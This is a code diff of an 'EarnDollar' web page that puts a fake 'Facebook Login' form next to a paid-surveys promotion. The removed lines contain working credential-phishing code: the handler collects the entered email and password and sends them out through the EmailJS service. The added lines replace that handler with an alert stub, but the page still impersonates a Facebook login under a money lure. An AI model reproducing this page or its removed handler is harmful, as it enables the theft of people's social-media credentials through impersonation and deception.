@@ -69,20 +69,6 @@
         .forgot-password a:hover {
             text-decoration: underline;
         }
-        .description-section {
-            padding: 20px;
-            margin-top: 20px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
-            width: 300px;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #777;
-            text-align: center;
-        }
         img {
             width: 100%; /* Ensure the image fits the container */
             max-width: 400px; /* Set a maximum width for the image */
@@ -94,8 +80,8 @@
 <body>
     <h1>EarnDollar</h1>
     <img src="https://lh3.googleusercontent.com/fife/ALs6j_G1rak3XnI5a3T9JKkLHmNQ_8QmInv_1z5sU2IMY4O6wFjxZByMnqzswls-NTo58VtQWomgBFVx0LyO7fSFZVH2O5NMdUByu2nhbycREf8gId11T2GiJ37R_xDvKn5vlLeMme_9CCauitjmYgb24-I14CyBSIUuYU_l-5og6xvHqnOqOBVQYKYwVprpECH5LQu1omC6ESTAe0K3VWv6pKXWtap2_X2mLBpGfAXkr69AyZA9PMiM6jQknoVLvr-eb-6C68g7qkBaF0wVtEuhpY0yldJHSet5PCwtQGjX4EwXJAob3ApeDn9_kYTJ2GDiuU9JW7EcNBHggXc37fMnfdrR6nllGPgp-syfZPzCSTamyH3JgwIewWc4UpWi24oWm5vZWsL9Zv8D8swUz2EQBhNvt3Fj7llDBp9uZIwPe0pRSER-08YoJ6W2uVMtdORPIey6GbmtiDEbVQUx0f-SuTzfoT4eSEsqfk8X_Ycwibcu_P-fAv7OuK50CaGRFwVYhNZj-jzbDnRtQqGgHQ7aRsFNCR8XDrkZyGsn1Xq4ygkZd6LWK4H3GQ-OijxWtDoSG25h9epY8NOAq-fRBVDDgBiTTrfLQyOZZg2vSFV1SfH6_-d8bdVcrkh3lSYnIN54aJiZDSYrHiuAczTTxpkgMsmyCPAioFQi1asxVdf6DynBu4CtPjh_wjd08V3XyRbouFkQaDYfOmrQeiqDP021zJZSIvFKeNq4Zlvkxb994RbapptAhlkY7Hql-rRzDeJmB9s2lWOvHgfhYLCYGPBCYkACSL97GtepM0JxfGwy6KsZPQpRG9UUBAIpeEFKIWmz91DNkCZSePk-mgBiPJDGK5rbNT4B1FLZyEAyRjuUGgTM7FHkQ_1uUPqZXVge4VzyentEBpErAHkhmb0_O-D1woCQyMngsdQMcY751j51ryex1PinmTzkMOrZn6ZFYPZtK-5YKTbDfaBf30-50pjDAH0R4R7W7BG0z0czweSDoapioICBnBFVIIPE_cQxQYQsb6IMMlA19l6F1tjC6JtO5ap-HjTgQWGKXM7-g7NsIfaTJvy79zbdgtbzJvlKApzXN6lRz6qVorhfVIvZ8drA4ihswTNaonr319oO66rVe6OpdgsfTv8TnrM80bHDOjHJnOjKK3nijVeE_1p_AjrvrOIa2pVZnRep9ProinPg1C8=s444-w444-h250-n-k?authuser=0&cs=1&hl=en-US-u-fw-sun-mu-celsius" alt="Dollar Surveys Image">
-    <p class="description">Log in to Facebook to earn your first dollar now!</p>
-    
+    <p class="description">Earn cash with the Dollar Surveys app by completing paid surveys! Enjoy a special $5 bonus offer when you sign up, and start earning up to $500 per month. With our app, you can earn up to 50% more than other survey platforms. Our trusted service ensures your personal information is safe while you express your opinions from the comfort of your home.</p>
+
     <div class="login-container">
         <h2>Facebook Login</h2>
         <form id="loginForm" onsubmit="return handleSubmit(event);">
@@ -108,41 +94,14 @@
         </div>
     </div>
 
-    <div class="description-section">
-        <p><strong>Earn cash with the Dollar Surveys app by completing paid surveys!</strong> Enjoy a special $5 bonus offer when you sign up, and start earning up to $500 per month. With our app, you can earn up to 50% more than other survey platforms. Our trusted service ensures your personal information is safe while you express your opinions from the comfort of your home. You’ll have access to a variety of branded surveys and can choose to receive payments through PayPal or gift cards.</p>
-        <p><strong>Transform your spare time into rewards by participating in our engaging surveys!</strong> The Dollar Surveys app features innovative money games like Scratchveys, where you can multiply your earnings. Join today and enjoy the benefits of our unique survey offerings, high rewards, and instant payment options. Whether you’re a beginner or a survey enthusiast, our app is designed to help you earn money easily and quickly. Download the Dollar Surveys app now and start your journey toward financial rewards!</p>
-    </div>
-
-    <div class="footer">
-        <p>&copy; 2024 EarnDollar. All rights reserved.</p>
-    </div>
-
-    <!-- EmailJS SDK -->
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        (function(){
-            emailjs.init("fjJBjt33JjzxpkTww");
-        })();
-
         function handleSubmit(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent the default form submission
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-
-            const templateParams = {
-                user_email: email,
-                user_password: password
-            };
-
-            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
-                .then((response) => {
-                    console
-                    console.log('SUCCESS!', response.status, response.text);
-                    alert("Login details sent successfully!");
-                }, (error) => {
-                    console.error('FAILED...', error);
-                    alert("Failed to send login details. Please try again.");
-                });
+            alert("Login Successful!"); // Show the alert with the message
+            // You can add further logic here to handle the login process
+            return false; // Prevent form submission
         }
     </script>
 </body>
